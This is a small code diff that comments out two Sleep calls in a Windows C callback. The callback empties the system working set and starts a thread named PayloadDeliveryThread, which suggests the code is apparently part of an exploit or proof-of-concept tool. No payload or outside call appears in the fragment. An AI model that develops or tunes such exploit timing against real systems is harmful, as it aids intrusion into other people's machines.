@@ -242,10 +242,10 @@ VOID CALLBACK FetchDataCallback (
         EmptySystemWorkingSet();
 
         PrintDebug(L"Give the memory manager a moment to think\n");
-        Sleep(100);
+        //Sleep(100);
 
         CloseHandle(CreateThread(NULL, 0, PayloadDeliveryThread, NULL, 0, NULL));
-        Sleep(500);
+        //Sleep(500);
     }
 
     ReleaseSRWLockExclusive(&sFetchDataCallback);
